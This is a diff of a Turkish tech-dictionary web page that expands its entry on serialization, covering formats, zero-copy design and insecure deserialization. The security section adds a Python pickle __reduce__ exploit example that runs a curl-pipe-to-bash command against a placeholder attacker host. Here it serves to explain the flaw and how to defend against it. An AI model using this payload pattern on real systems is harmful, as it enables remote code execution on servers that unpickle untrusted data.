@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Serialization Nedir, Ne Demek? Serileştirme ve Veri Dönüşümü · TreScout</title>
-<meta name="description" content="Serialization (serileştirme), bellekteki karmaşık veri yapılarını dosyalara kaydetmek veya ağdan iletmek üzere bayt ya da metin dizisine dönüştürme işlemidir.">
+<title>Serialization Nedir, Ne Demek? Veri Serileştirme Rehberi · TreScout</title>
+<meta name="description" content="Serialization (serileştirme) nedir? Bellekteki nesnelerin bayt akışına dönüşümü, JSON vs Protobuf, zero-copy mimarisi ve güvenlik zaafiyetleri rehberi.">
 <link rel="icon" type="image/svg+xml" href="/favicon.svg">
 <link rel="alternate" hreflang="tr" href="https://trescout.com/dictionary/serialization/">
 <link rel="alternate" hreflang="en" href="https://trescout.com/en/dictionary/serialization/">
@@ -14,8 +14,8 @@
 <link rel="alternate" hreflang="de" href="https://trescout.com/de/dictionary/serialization/">
 <link rel="alternate" hreflang="x-default" href="https://trescout.com/en/dictionary/serialization/">
 <link rel="canonical" href="https://trescout.com/dictionary/serialization/">
-<meta property="og:title" content="Serialization Nedir, Ne Demek? Serileştirme ve Veri Dönüşümü · TreScout">
-<meta property="og:description" content="Serialization (serileştirme), bellekteki karmaşık veri yapılarını dosyalara kaydetmek veya ağdan iletmek üzere bayt ya da metin dizisine dönüştürme işlemidir.">
+<meta property="og:title" content="Serialization Nedir, Ne Demek? Veri Serileştirme Rehberi · TreScout">
+<meta property="og:description" content="Serialization (serileştirme) nedir? Bellekteki nesnelerin bayt akışına dönüşümü, JSON vs Protobuf, zero-copy mimarisi ve güvenlik zaafiyetleri rehberi.">
 <meta property="og:url" content="https://trescout.com/dictionary/serialization/">
 <meta property="og:type" content="article">
 <meta property="og:locale" content="tr_TR">
@@ -24,15 +24,18 @@
 <meta property="og:image:height" content="630">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@GetTreScout">
-<meta name="twitter:title" content="Serialization Nedir, Ne Demek? Serileştirme ve Veri Dönüşümü · TreScout">
+<meta name="twitter:title" content="Serialization Nedir, Ne Demek? Veri Serileştirme Rehberi · TreScout">
+<meta name="twitter:description" content="Serialization (serileştirme) nedir? Bellekteki nesnelerin bayt akışına dönüşümü, JSON vs Protobuf, zero-copy mimarisi ve güvenlik zaafiyetleri rehberi.">
 <meta name="twitter:image" content="https://trescout.com/assets/dictionary/og/serialization.webp">
+<meta property="og:image:alt" content="Serialization nedir?">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "DefinedTerm",
   "name": "Serialization",
+  "alternateName": "Serileştirme",
   "inLanguage": "tr",
-  "description": "Serialization (serileştirme), bir programlama dilinin çalışma belleğinde (RAM) tutulan karmaşık nesneleri ve veri yapılarını, depolanabilir veya ağ üzerinden iletilebilir düz bir bayt dizisi ya da metin formatına dönüştürme işlemidir.",
+  "description": "Serialization (serileştirme), bir programlama dilinin çalışma belleğinde (RAM) dinamik olarak tahsis edilen nesneleri, veri yapılarını ve işaretçi (pointer) grafiklerini; ağ üzerinden iletilebilir veya diskte saklanabilir düz, doğrusal bir bayt akışına ya da metin formatına dönüştürme işlemidir.",
   "inDefinedTermSet": {
     "@type": "DefinedTermSet",
     "name": "TreScout Teknoloji Sözlüğü",
@@ -48,18 +51,42 @@
   "mainEntity": [
     {
       "@type": "Question",
-      "name": "Neden serileştirmeye ihtiyaç duyarız?",
+      "name": "Serialization ve Deserialization arasındaki temel fark nedir?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "Bilgisayarın belleğindeki veriler geçicidir ve sadece o sürece özeldir. Başka bir bilgisayara, mikroservise veya kalıcı diske veri göndermek için onu evrensel bir akışa çevirmek gerekir."
+        "text": "Serialization, bellekteki canlı nesneleri saklanabilir veya iletilebilir bir bayt/metin akışına dönüştürme sürecidir. Deserialization ise bu bayt dizisini okuyup ayrıştırarak hedef sistemin belleğinde yeniden çalışan bir nesneye dönüştürme işlemidir."
       }
     },
     {
       "@type": "Question",
-      "name": "JSON ile Protocol Buffers arasındaki temel fark nedir?",
+      "name": "Web projelerinde JSON yerine ne zaman Protobuf veya FlatBuffers kullanılmalıdır?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "JSON insan tarafından okunabilir ve esnektir; Protobuf ise ikili (binary) formatta sıkıştırılmış olup şema bağımlıdır, çok daha az yer kaplar ve katbekat hızlı serileştirilir."
+        "text": "Genel internete açık web istemcileri ve halka açık API'ler için tarayıcı uyumluluğu ve hata ayıklama kolaylığı nedeniyle JSON idealdir. Ancak dahili mikroservisler, mobil uygulama arka uçları veya gerçek zamanlı veri akışlarında ağ bant genişliğini kısmak ve CPU ayrıştırma maliyetini düşürmek için Protobuf veya FlatBuffers tercih edilmelidir."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Insecure Deserialization saldırısı nasıl çalışır ve nasıl engellenir?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Saldırgan, ters serileştirme sırasında çalıştırılacak zararlı fonksiyon veya sınıf yapılarını serileştirilmiş veri içine enjekte eder. Sunucu bu veriyi ayrıştırdığında sistem komutları tetiklenebilir. Engellemek için sınıf mantığı taşıyan formatlar terk edilmeli, sadece saf veri taşıyan şemalı formatlar (Protobuf, JSON Schema) kullanılmalıdır."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Zero-copy deserialization ne anlama gelir?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Gelen bayt akışını yeni bellek alanları ayırıp kopyalamak yerine, veriyi doğrudan tampon bellek üzerindeki işaretçi ofsetleriyle okuma tekniğidir. Bellek tahsisini sıfırlayarak işlemciyi ve çöp toplayıcıyı rahatlatır."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Şema evrimi (Schema Evolution) nedir; geriye ve ileriye uyumluluk nasıl sağlanır?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Yazılım güncellendikçe veri modelleri değişir. Protobuf ve Avro gibi sistemler, alanlara benzersiz sayısal kimlikler vererek eski istemcilerin yeni alanları yok saymasını (backward compatibility), yeni istemcilerin de eski verileri varsayılan değerlerle okuyabilmesini (forward compatibility) sağlar."
       }
     }
   ]
@@ -67,14 +94,10 @@
 </script>
 <link rel="alternate" type="text/markdown" href="/dictionary/serialization.md">
 <link rel="preload" href="/assets/fonts/inter-latin.woff2" as="font" type="font/woff2" crossorigin>
-      <link rel="preload" href="/assets/fonts/inter-latin-ext.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/inter-latin-ext.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/assets/site.css">
 <link rel="stylesheet" href="/assets/discover.css">
 <link rel="stylesheet" href="/assets/dictionary.css">
-
-<meta name="twitter:description" content="Serialization (serileştirme), bellekteki karmaşık veri yapılarını dosyalara kaydetmek veya ağdan iletmek üzere bayt ya da metin dizisine dönüştürme işlemidir.">
-
-<meta property="og:image:alt" content="Serialization nedir?">
 </head>
 <body>
 <a class="skip-link" href="#main">Ana içeriğe atla</a>
@@ -83,10 +106,29 @@
 <article class="disc">
 <a class="disc-back" href="/dictionary/">← Sözlük</a>
 <div class="disc-top"><span class="disc-eyebrow">Sözlük · Geliştirme</span><time class="dict-time" datetime="2026-09-19">Son güncelleme: 19 Eylül 2026</time></div>
-<h1 class="disc-title">Serialization <span class="disc-accent">nedir?</span></h1>
+<h1 class="disc-title">Serialization <span class="disc-accent">nedir, ne demek ve nasıl çalışır?</span></h1>
 
-<p class="disc-lead">Serialization (serileştirme), bir programlama dilinin çalışma belleğinde (RAM) tutulan karmaşık nesneleri ve veri yapılarını, depolanabilir veya ağ üzerinden iletilebilir düz bir bayt dizisi ya da metin formatına dönüştürme işlemidir.</p>
-<section class="disc-sec"><h2>Tanım</h2><p>Bilgisayarın belleğinde dinamik ve karmaşık bir şekilde tutulan nesneleri (örneğin bir kullanıcı profili, oturum verisi veya oyun durumu), internet üzerinden göndermek ya da bir dosyaya/veritabanına kaydetmek için düz bir akışa çevirmeniz gerekir. Bu işleme serileştirme (serialization) denir. Karşı taraf bu veriyi aldığında ise <strong>deserialization (ters serileştirme)</strong> yaparak tekrar canlı bellek nesnesine kavuşturur.</p></section><section class="disc-sec"><h2>Serialization ne demek ve nasıl çalışır?</h2><p>Bellekteki nesneler genellikle dağınık bellek adreslerine ve referanslara (pointers) sahiptir. Başka bir sunucu veya program bu yerel bellek adreslerini doğrudan okuyamaz. Serialization işlemi, bu hiyerarşik nesne ağacını doğrusal (linear) bir biçime sokar.</p></section><section class="disc-sec"><h2>En yaygın serileştirme formatları</h2><p><strong>JSON (JavaScript Object Notation):</strong> Web API'lerinin, REST servislerinin ve modern web uygulamalarının fiili standardıdır; insanlar tarafından kolayca okunabilir.</p><p><strong>Protocol Buffers (Protobuf):</strong> Google tarafından geliştirilen, mikroservisler (gRPC) arasında inanılmaz hız ve düşük ağ bant genişliği sunan kompakt ikili (binary) formattır.</p><p><strong>MessagePack &amp; BSON:</strong> JSON benzeri anahtar-değer yapılarını ikili formatta hızlandıran ve sıkıştıran çözümlerdir.</p><p><strong>YAML &amp; XML:</strong> İnsan tarafından okunabilir yapılandırma dosyalarında ve eski kurumsal sistem entegrasyonlarında tercih edilir.</p><p><strong>Dile Özgü Formatlar:</strong> Python'daki <code>pickle</code> veya Java nesne serileştirme kütüphaneleri (güvenlik açıklarına dikkat edilmelidir).</p></section><div class="dict-analogy">Bir mobilyayı taşımak için parçalarına ayırıp düz ve yassı bir kutuya yerleştirmek gibidir; varış noktasında kutuyu açıp kılavuza bakarak mobilyayı tekrar kurarsınız (deserialization).</div><section class="disc-sec"><h2>Güvenlik boyutu: Deserialization zaafiyetleri</h2><p>Güvenilmeyen veya dış kaynaklardan gelen serileştirilmiş verilerin kontrolsüzce deserialization işlemine tabi tutulması, uzaktan kod çalıştırma (RCE) açıklarına yol açabilir. Bu nedenle modern yazılımlarda çalıştırılabilir kod içeren serileştirme yerine, sıkı şema doğrulaması (schema validation) sunan JSON veya Protobuf tercih edilir.</p></section><section class="disc-sec"><h2>Sıkça sorulanlar</h2><div class="dict-faq"><div class="dict-faq-item"><p class="dict-faq-q">Neden serileştirmeye ihtiyaç duyarız?</p><p class="dict-faq-a">Bilgisayarın belleğindeki veriler geçicidir ve sadece o sürece özeldir. Başka bir bilgisayara, mikroservise veya kalıcı diske veri göndermek için onu evrensel bir akışa çevirmek gerekir.</p></div><div class="dict-faq-item"><p class="dict-faq-q">JSON ile Protocol Buffers arasındaki temel fark nedir?</p><p class="dict-faq-a">JSON insan tarafından okunabilir ve esnektir; Protobuf ise ikili (binary) formatta sıkıştırılmış olup şema bağımlıdır, çok daha az yer kaplar ve katbekat hızlı serileştirilir.</p></div></div></section><section class="disc-sec"><h2>İlgili terimler</h2><div class="dict-related"><a href="/dictionary/api/">API</a><a href="/dictionary/data-pipeline/">Data Pipeline</a></div></section>
+<p class="disc-lead">Serialization (serileştirme), bir programlama dilinin çalışma belleğinde (RAM) dinamik olarak tahsis edilen nesneleri, veri yapılarını ve işaretçi (pointer) grafiklerini; ağ üzerinden iletilebilir veya diskte saklanabilir düz, doğrusal bir bayt akışına (byte stream) ya da metin formatına dönüştürme işlemidir.</p>
+
+<p>Tersine işlem olan <strong>deserialization (ters serileştirme)</strong> ise bu bayt dizisini hedef sistemin belleğinde ayrıştırarak orijinal nesne hiyerarşisini, tiplerini ve değerlerini yeniden inşa eder.</p>
+
+<section class="disc-sec"><h2>Serialization Ne Demek ve Neden Zorunludur? Bellek Modeli</h2><p>Modern işletim sistemlerinde her süreç (process) kendine ait izole bir sanal bellek adres uzayında (virtual address space) çalışır. Çalışma zamanında bir nesne; yığın (stack) üzerinde yerel değişkenler, öbek (heap) üzerinde dinamik ayrılmış bellek blokları, fonksiyon işaretçileri (vtable) ve referans adresleri (<code>0x7ffee4b2...</code>) barındırır.</p><p>Bu bellek yapısı iki temel nedenden ötürü doğrudan başka bir ortama kopyalanamaz:</p><ol><li><strong>Adres Uzayı İzolasyonu:</strong> Bellek işaretçileri (pointers) sadece o anki çalışan sürecin sanal adres tablosunda anlamlıdır. Aynı sunucudaki başka bir sürece veya ağdaki bir istemciye bir bellek işaretçisi gönderdiğinizde, hedef sistemde geçersiz bellek erişimi (segmentation fault) veya bellek bozulması oluşur.</li><li><strong>Mimari ve Endianness Farklılıkları:</strong> Farklı işlemci mimarileri (örneğin Little-Endian x86-64 ile Big-Endian ağ donanımları) çok baytlı tamsayıları ve kayan noktalı sayıları bellekte farklı bayt sıralamasıyla tutar. Ayrıca 32-bit ve 64-bit sistemlerde işaretçi genişlikleri ve veri hizalamaları (alignment/padding) farklıdır.</li></ol><p>Serialization mekanizması; bellekteki nesne grafını (döngüsel referanslar dahil) derinlemesine veya genişlemesine dolaşır (graph traversal), yerel işaretçileri mantıksal ilişkilere dönüştürür ve veriyi platformdan bağımsız kanonik bir bayt dizilimine sokar.</p></section>
+
+<section class="disc-sec"><h2>Serileştirme Formatları: Metin Tabanlı vs İkili (Binary)</h2><p>Yazılım mimarisinde doğru serileştirme formatını seçmek; insan okunabilirliği, CPU ayrıştırma (parse) maliyeti, ağ bant genişliği ve tip güvenliği arasında bir denge kurmayı gerektirir.</p><h3>1. Metin Tabanlı Formatlar (JSON, YAML, XML)</h3><ul><li><strong>JSON (JavaScript Object Notation):</strong> Modern webin ve RESTful API'lerin fiili standardıdır. Dilden bağımsızdır, tarayıcılarda yerel olarak desteklenir ve geliştiriciler tarafından kolayca okunup hata ayıklanabilir (debuggable).</li><li><strong>Zayıf Yönleri:</strong> Metin tabanlı ayrıştırma (lexing, tokenizing, string-to-number dönüşümleri) ciddi CPU tüketir. Her kayıtta anahtar isimlerinin (field keys) tekrarlanması gereksiz ağ yükü (payload overhead) yaratır. Ayrıca ikili veri (örneğin bir görsel veya şifrelenmiş anahtar) taşımak için Base64 kodlaması gerekir; bu da veri boyutunu yaklaşık %33 oranında şişirir.</li></ul><h3>2. İkili (Binary) ve Şemalı Formatlar (Protobuf, Avro, MessagePack)</h3><ul><li><strong>Protocol Buffers (Protobuf):</strong> Google tarafından geliştirilen, gRPC ve mikroservis iletişiminin omurgasını oluşturan ikili formattır. Katı bir şema dosyası (<code>.proto</code>) ile alan tiplerini ve alan numaralarını (field tags) tanımlar. Ağ üzerinden metin anahtarlar yerine sayısal etiketler ve değişken uzunluklu tamsayı kodlaması (Varint) gönderilir. JSON'a kıyasla 3 ila 10 kat daha az bant genişliği tüketir ve çok daha hızlı ayrıştırılır.</li><li><strong>Apache Avro:</strong> Büyük veri (Hadoop, Kafka) ekosisteminde yaygındır. Şema, her mesajın içine gömülmek yerine merkezi bir kayıt defterinde (Schema Registry) tutulur. Bu sayede mesaj başına düşen ek yük minimuma iner.</li><li><strong>MessagePack ve BSON:</strong> JSON'ın esnek, şemasız (schemaless) anahtar-değer modelini koruyarak veriyi ikili düzeyde sıkıştırılmış biçimde saklar.</li></ul><table class="table-styled"><thead><tr><th>Format</th><th>Tip Sistemi</th><th>Şema Zorunluluğu</th><th>Okunabilirlik</th><th>Parse Maliyeti</th><th>Ana Kullanım Alanı</th></tr></thead><tbody><tr><td><strong>JSON</strong></td><td>Dinamik</td><td>İsteğe Bağlı (JSON Schema)</td><td>İnsan Okunabilir</td><td>Orta / Yüksek</td><td>Web API, Frontend</td></tr><tr><td><strong>Protobuf</strong></td><td>Katı Statik</td><td>Zorunlu (<code>.proto</code>)</td><td>İkili (Binary)</td><td>Düşük</td><td>Mikroservisler, gRPC</td></tr><tr><td><strong>FlatBuffers</strong></td><td>Katı Statik</td><td>Zorunlu (<code>.fbs</code>)</td><td>İkili (Binary)</td><td>Sıfır (Zero-Copy)</td><td>Oyunlar, HFT, Mobil</td></tr><tr><td><strong>Apache Avro</strong></td><td>Katı Statik</td><td>Zorunlu (<code>.avsc</code>)</td><td>İkili (Binary)</td><td>Düşük</td><td>Kafka, Büyük Veri</td></tr><tr><td><strong>MessagePack</strong></td><td>Dinamik</td><td>Yok</td><td>İkili (Binary)</td><td>Düşük / Orta</td><td>Redis önbellek, IPC</td></tr></tbody></table></section>
+
+<section class="disc-sec"><h2>Zero-Copy Deserialization Mimarisi</h2><p>Klasik serileştirme kütüphanelerinde (JSON ayrıştırıcıları veya standart Protobuf) deserialization süreci şu adımlarla yürütülür:</p><ol><li>Ağ soketinden gelen bayt akışı geçici bir tampon belleğe (buffer) yazılır.</li><li>Ayrıştırıcı baytları tarayarak tipleri doğrular.</li><li>Belleğin öbek (heap) alanında her nesne, dize ve dizi için yeni bellek tahsis edilir (<code>malloc</code> veya dilin bellek yöneticisi).</li><li>Değerler tampon bellekten yeni oluşturulan heap nesnelerine kopyalanır.</li></ol><p>Saniyede yüz binlerce isteğin işlendiği sistemlerde bu heap tahsisleri ve kopyalama işlemleri yüksek CPU tüketimine ve çöp toplayıcı (Garbage Collector) duraklamalarına yol açar.</p><p><strong>Zero-Copy (Sıfır Kopyalama) Yaklaşımı (FlatBuffers, Cap'n Proto):</strong> Bu kütüphanelerde veri serileştirilirken, bellekteki veri yapısı hizalamasına (memory alignment) ve göreceli kaydırma adreslerine (relative offsets) uygun şekilde ikili tampona yerleştirilir.</p><p>Deserialization aşamasında hiçbir bellek tahsisi veya veri kopyalama gerçekleşmez. Uygulama, gelen bayt tamponunu doğrudan belleğe haritalar (mmap) ve nesne alanlarına doğrudan işaretçi aritmetiği ile erişir. Deserialization süresi fiilen 0 milisaniyedir. Bu mimari; yüksek frekanslı alım-satım (HFT), uç bilişim (Edge AI) ve AAA oyun motorlarında standarttır.</p></section>
+
+<section class="disc-sec"><h2>Güvenlik Boyutu: Insecure Deserialization (CWE-502)</h2><p>Serileştirme yalnızca saf veri taşımak yerine, nesne sınıflarını ve çalışma zamanı davranışlarını da serileştirmeye çalıştığında felaket boyutunda güvenlik açıkları doğar. OWASP Top 10 listesinde yer alan <strong>Insecure Deserialization (Güvensiz Ters Serileştirme)</strong>, saldırganın sistemde keyfi kod çalıştırmasına (Remote Code Execution - RCE) imkan tanır.</p><h3>Python <code>pickle</code> Örneği</h3><p>Python'ın dahili serileştirme modülü <code>pickle</code>, nesnelerin <code>__reduce__</code> metodunu serileştirir. Bu metot, nesne deserialization sırasında çağrılacak bir fonksiyon ve parametrelerini tanımlar. Saldırgan bu mekanizmayı kötüye kullanarak işletim sistemi komutu çalıştıran zararlı bir bayt dizisi üretebilir:</p><pre><code># Saldırgan tarafından hazırlanan zararlı serileştirme paketi
+class Exploit:
+    def __reduce__(self):
+        import os
+        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))</code></pre><p>Bu bayt akışı sunucuya gönderilip <code>pickle.loads(payload)</code> çalıştırıldığı anda, sunucuda yetkisiz kabuk (shell) komutu yürütülür. Bu nedenle güvenilmeyen kaynaklardan gelen hiçbir veri <code>pickle</code> ile ayrıştırılmamalıdır.</p><h3>Java ve Nesne Zincirleri (Gadget Chains)</h3><p>Java'nın yerel serileştirme mekanizmasında (<code>ObjectInputStream.readObject()</code>), sınıf yükleyici (classloader) gelen nesnenin sınıfını belleğe yükler. Saldırgan; sistemde yüklü kütüphanelerde (örneğin Apache Commons Collections veya Spring Framework) bulunan sınıfların metotlarını birbirine bağlayarak (gadget chain) bellek üzerinde komut çalıştıran bir yürütme zinciri inşa edebilir.</p><h3>Güvenli Serileştirme İlkeleri</h3><ul><li>Asla çalıştırılabilir kod ya da sınıf tanımları içeren dille bütünleşik formatları (Python <code>pickle</code>, Java yerel serialization, PHP <code>unserialize</code>) ağ sınırlarında kullanmayın.</li><li>Sadece saf veri taşıyan ve veri yapısını şemaya göre doğrulayan (strict schema validation) formatları tercih edin (JSON + Pydantic/Zod veya Protobuf).</li><li>İkili veri alışverişlerinde kimlik doğrulama ve mesaj bütünlük kontrolü (HMAC veya TLS) uygulayın.</li></ul></section>
+
+<div class="dict-analogy">Bir mobilyayı taşımak için parçalarına ayırıp düz ve yassı bir kutuya yerleştirmek gibidir; varış noktasında kutuyu açıp kılavuza bakarak mobilyayı tekrar kurarsınız (deserialization).</div>
+
+<section class="disc-sec"><h2>Sıkça sorulanlar</h2><div class="dict-faq"><div class="dict-faq-item"><p class="dict-faq-q">Serialization ve Deserialization arasındaki temel fark nedir?</p><p class="dict-faq-a">Serialization, bellekteki canlı nesneleri saklanabilir veya iletilebilir bir bayt/metin akışına dönüştürme sürecidir. Deserialization ise bu bayt dizisini okuyup ayrıştırarak hedef sistemin belleğinde yeniden çalışan bir nesneye dönüştürme işlemidir.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Web projelerinde JSON yerine ne zaman Protobuf veya FlatBuffers kullanılmalıdır?</p><p class="dict-faq-a">Genel internete açık web istemcileri ve halka açık API'ler için tarayıcı uyumluluğu ve hata ayıklama kolaylığı nedeniyle JSON idealdir. Ancak dahili mikroservisler, mobil uygulama arka uçları veya gerçek zamanlı veri akışlarında ağ bant genişliğini kısmak ve CPU ayrıştırma maliyetini düşürmek için Protobuf veya FlatBuffers tercih edilmelidir.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Insecure Deserialization saldırısı nasıl çalışır ve nasıl engellenir?</p><p class="dict-faq-a">Saldırgan, ters serileştirme sırasında çalıştırılacak zararlı fonksiyon veya sınıf yapılarını serileştirilmiş veri içine enjekte eder. Sunucu bu veriyi ayrıştırdığında sistem komutları tetiklenebilir. Engellemek için sınıf mantığı taşıyan formatlar terk edilmeli, sadece saf veri taşıyan şemalı formatlar (Protobuf, JSON Schema) kullanılmalıdır.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Zero-copy deserialization ne anlama gelir?</p><p class="dict-faq-a">Gelen bayt akışını yeni bellek alanları ayırıp kopyalamak yerine, veriyi doğrudan tampon bellek üzerindeki işaretçi ofsetleriyle okuma tekniğidir. Bellek tahsisini sıfırlayarak işlemciyi ve çöp toplayıcıyı rahatlatır.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Şema evrimi (Schema Evolution) nedir; geriye ve ileriye uyumluluk nasıl sağlanır?</p><p class="dict-faq-a">Yazılım güncellendikçe veri modelleri değişir. Protobuf ve Avro gibi sistemler, alanlara benzersiz sayısal kimlikler vererek eski istemcilerin yeni alanları yok saymasını (backward compatibility), yeni istemcilerin de eski verileri varsayılan değerlerle okuyabilmesini (forward compatibility) sağlar.</p></div></div></section>
+
+<section class="disc-sec"><h2>İlgili terimler</h2><div class="dict-related"><a href="/dictionary/api/">API</a><a href="/dictionary/data-pipeline/">Data Pipeline</a><a href="/dictionary/memory-management/">Memory Management</a><a href="/dictionary/network-stack/">Network Stack</a></div></section>
 <section class="disc-sec"><h2>İlgili araçlar</h2><div class="dict-related"><a href="/discover/yaml-cpp/">YAML Cpp</a></div></section>
 <aside class="disc-cta"><p><strong>Her sabah Sektörden Terimler e-postanızda.</strong> Teknoloji dünyasında her gün yeni bir terim çıkıyor; geride kalmamak için TreScout'a katılın.</p><form class="cta-form disc-cta-form js-subscribe" data-source="dictionary" action="/api/subscribe" method="post"><div class="form-row"><input class="input" type="email" name="email" placeholder="E-postanızı yazın" autocomplete="email" required><button class="btn btn-primary" type="submit">Erken erişim</button></div><label class="form-consent"><input type="checkbox" name="consent" required><span><a href="/privacy.html" target="_blank" rel="noopener">Aydınlatma Metni</a>'ni okudum, e-postamın bu amaçla işlenmesini onaylıyorum.</span></label><input type="text" name="website" tabindex="-1" autocomplete="off" aria-hidden="true" class="hp-field"></form><a class="btn btn-ghost disc-cta-all" href="/dictionary/">Tüm sözlük →</a></aside>
 <p class="disc-disclaimer">Bu açıklama TreScout için sade dille hazırlandı · yanlış ya da eksik gördüğünüz bir şey olursa <a href="mailto:hello@trescout.com">hello@trescout.com</a>. TreScout her gün GitHub, Hacker News ve HuggingFace trendlerini Türkçe özetler.</p>
